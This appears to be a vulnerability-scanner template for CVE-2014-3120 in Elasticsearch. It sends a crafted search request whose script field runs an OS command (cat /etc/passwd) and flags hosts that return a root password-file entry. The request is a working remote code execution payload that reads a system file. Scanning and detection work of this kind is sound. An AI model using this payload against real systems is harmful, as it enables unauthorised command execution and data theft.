id: CVE-2014-3120
info:
  name: ElasticSearch v1.1.1/1.2 RCE
  author: pikpikcu
  severity: critical
  description: The CVE-2014-3120 vulnerability in ElasticSearch allows remote attackers
    to execute arbitrary code through dynamic scripting in versions before 1.2, but
    is only a security issue if the program is not run in its own independent virtual
    machine.
  reference:
  - https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2014-3120
  - https://www.elastic.co/blog/logstash-1-4-3-released
  - https://nvd.nist.gov/vuln/detail/CVE-2014-3120
  - http://bouk.co/blog/elasticsearch-rce/
  classification:
    cve-id: CVE-2014-3120
  tags: rce,elasticsearch,kev,vulhub,cve,cve2014,elastic
  metadata:
    impact: The CVE-2014-3120 vulnerability in Elasticsearch allows remote attackers
      to execute arbitrary code, which can result in a significant impact on the system's
      security and functionality.
    recommendation: It is recommended to run Elasticsearch in its own independent
      virtual machine to prevent remote attackers from executing arbitrary MVEL expressions
      and Java code via the source parameter to _search.
requests:
- raw:
  - "POST /_search?pretty HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\nAccept-Language:\
    \ en\nContent-Type: application/x-www-form-urlencoded\n\n{\n    \"size\": 1,\n\
    \    \"query\": {\n      \"filtered\": {\n        \"query\": {\n          \"match_all\"\
    : {\n          }\n        }\n      }\n    },\n    \"script_fields\": {\n     \
    \   \"command\": {\n            \"script\": \"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\\
    \"cat /etc/passwd\\\").getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next();\"\
    \n        }\n    }\n}\n"
  matchers-condition: and
  matchers:
  - type: word
    words:
    - application/json
    part: header
  - type: regex
    regex:
    - 'root:.*:0:0:'
    part: body
  - type: status
    status:
    - 200
